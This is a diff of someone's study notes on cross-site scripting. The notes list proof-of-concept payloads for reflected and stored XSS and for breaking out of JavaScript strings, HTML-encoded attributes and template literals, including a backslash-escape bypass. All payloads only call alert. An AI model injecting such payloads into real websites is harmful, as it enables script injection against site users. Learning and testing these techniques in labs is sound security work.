@@ -3,7 +3,7 @@
 #apprentice 
 #### reflected
 in [[cause & sinks#reflected|this]] case: 
-> https://insecure-website.com/search?term=`<script>alert(1)</script>`
+> `https://insecure-website.com/search?term=<script>alert(1)</script>`
 #### stored
 in [[cause & sinks#stored|this]] case:
 > comment=`<script>alert(1)</script>`
@@ -31,9 +31,15 @@ in [[cause & sinks#DOM-based|this]] case
 ## XSS into JavaScript
 
 ##### Terminating the existing script 
-`<script> ... var input = 'controllable data here'; ... </script>` 
+context: `<script> ... var input = 'controllable data here'; ... </script>` 
 - `</script><img src=1 onerror=alert(document.domain)>` (reason:HTML parsing first)
 - single quote and backslash escaped -> `</script><script>alert(1)</script>`
 ##### Breaking out of a JavaScript string
-- `'-alert(1)-'`
-- `';alert(1)//`
+- `'-alert(1)-'` OR `';alert(1)//`
+  - back slash escape :  `\';alert(1)//` -> `\\';alert(1)//` -> `';alert(1)//`
+##### Making use of HTML-encoding
+context: `<a href="#" onclick="... var input='controllable data here'; ...">`
+- `&apos;-alert(1)-&apos;`
+##### XSS in JavaScript template literals
+context: ``<script> ... var input = `controllable data here`; ... </script>`` 
+- `${alert(1)}`
